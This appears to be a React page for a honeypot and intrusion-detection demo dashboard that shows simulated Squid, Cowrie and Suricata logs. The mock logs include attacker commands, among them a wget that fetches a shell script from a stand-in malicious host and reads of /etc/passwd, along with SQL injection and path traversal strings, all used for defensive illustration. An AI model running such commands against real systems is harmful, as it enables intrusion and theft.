import { useState, useCallback, useRef, useEffect } from "react";
import { Link } from "react-router-dom";
import DashboardHeader from "@/components/DashboardHeader";
import ArchitectureDiagram from "@/components/ArchitectureDiagram";
import StatusCards from "@/components/StatusCards";
import LogPanel from "@/components/LogPanel";
import AttackButtons from "@/components/AttackButtons";
import FlowExplanation from "@/components/FlowExplanation";

const SQUID_LOGS = [
  "GET /index.html - TCP_HIT/200",
  "GET /login.php - TCP_MISS/200",
  "POST /login.php - TCP_MISS/302",
  "GET /dashboard.php - TCP_HIT/200",
  "GET /style.css - TCP_HIT/200",
  "GET /api/users - TCP_MISS/200",
  "GET /images/logo.png - TCP_HIT/200",
];

const COWRIE_LOGS = [
  "Login attempt: root / password123",
  "Login attempt: admin / admin",
  "CMD: ls -la",
  "CMD: whoami",
  "CMD: cat /etc/passwd",
  "CMD: wget http://malware.bad/shell.sh",
  "CMD: chmod +x shell.sh",
  "CMD: uname -a",
  "Login attempt: root / toor",
];

const SURICATA_LOGS = [
  "ALERT: ET SCAN Suspicious inbound to port 22",
  "ALERT: SQL Injection attempt detected",
  "ALERT: Suspicious User-Agent string",
  "ALERT: Possible brute force attack on SSH",
  "ALERT: XSS attempt in HTTP request",
  "ALERT: Known malicious IP connection",
  "ALERT: Unusual outbound traffic pattern",
];

const WEB_ATTACK_SQUID = [
  "GET /login.php?id=1' OR 1=1-- - TCP_MISS/200",
  "POST /login.php - TCP_MISS/403",
  "GET /admin.php - TCP_MISS/403",
  "GET /../../etc/passwd - TCP_MISS/400",
  "GET /shell.php - TCP_MISS/404",
];

const Index = () => {
  const [activeFlow, setActiveFlow] = useState<"normal" | "ssh" | "web" | null>(null);
  const [squidLogs, setSquidLogs] = useState<string[]>([]);
  const [cowrieLogs, setCowrieLogs] = useState<string[]>([]);
  const [suricataLogs, setSuricataLogs] = useState<string[]>([]);
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const clearInterval_ = useCallback(() => {
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
  }, []);

  useEffect(() => () => clearInterval_(), [clearInterval_]);

  const handleSimulate = useCallback(
    (type: "normal" | "ssh" | "web") => {
      if (activeFlow === type) {
        setActiveFlow(null);
        clearInterval_();
        return;
      }

      clearInterval_();
      setActiveFlow(type);

      let idx = 0;
      intervalRef.current = setInterval(() => {
        if (type === "normal") {
          setSquidLogs((prev) => [...prev.slice(-30), SQUID_LOGS[idx % SQUID_LOGS.length]]);
        } else if (type === "ssh") {
          setCowrieLogs((prev) => [...prev.slice(-30), COWRIE_LOGS[idx % COWRIE_LOGS.length]]);
          if (idx % 2 === 0) {
            setSuricataLogs((prev) => [...prev.slice(-30), SURICATA_LOGS[idx % SURICATA_LOGS.length]]);
          }
        } else {
          setSquidLogs((prev) => [...prev.slice(-30), WEB_ATTACK_SQUID[idx % WEB_ATTACK_SQUID.length]]);
          setSuricataLogs((prev) => [...prev.slice(-30), SURICATA_LOGS[(idx + 1) % SURICATA_LOGS.length]]);
        }
        idx++;
      }, 800);
    },
    [activeFlow, clearInterval_]
  );

  return (
    <div className="min-h-screen bg-background relative">
      <div className="absolute inset-0 grid-bg opacity-40 pointer-events-none" />
      <div className="relative z-10 max-w-7xl mx-auto pb-12">
        <DashboardHeader />
        <ArchitectureDiagram activeFlow={activeFlow} />
        <StatusCards />
        <AttackButtons onSimulate={handleSimulate} activeFlow={activeFlow} />
        <section className="px-4 py-6">
          <h2 className="font-display text-sm tracking-widest text-muted-foreground uppercase mb-4 text-center">
            Advanced Monitoring
          </h2>
          <div className="flex justify-center">
            <Link
              to="/human-in-the-loop"
              className="font-mono text-xs px-6 py-3 rounded-md border border-primary/30 text-primary hover:bg-primary/10 hover:border-primary/60 transition-all duration-300 tracking-wide neon-border"
            >
              Human in the Loop - Deceptive Honeypot Dashboard
            </Link>
          </div>
        </section>
        <section className="px-4 py-6">
          <h2 className="font-display text-sm tracking-widest text-muted-foreground uppercase mb-4 text-center">
            Live Log Terminals
          </h2>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <LogPanel title="squid-proxy.log" logs={squidLogs} color="text-neon" />
            <LogPanel title="cowrie-honeypot.log" logs={cowrieLogs} color="text-success" />
            <LogPanel title="suricata-alerts.log" logs={suricataLogs} color="text-danger" />
          </div>
        </section>
        <FlowExplanation />
      </div>
    </div>
  );
};

export default Index;
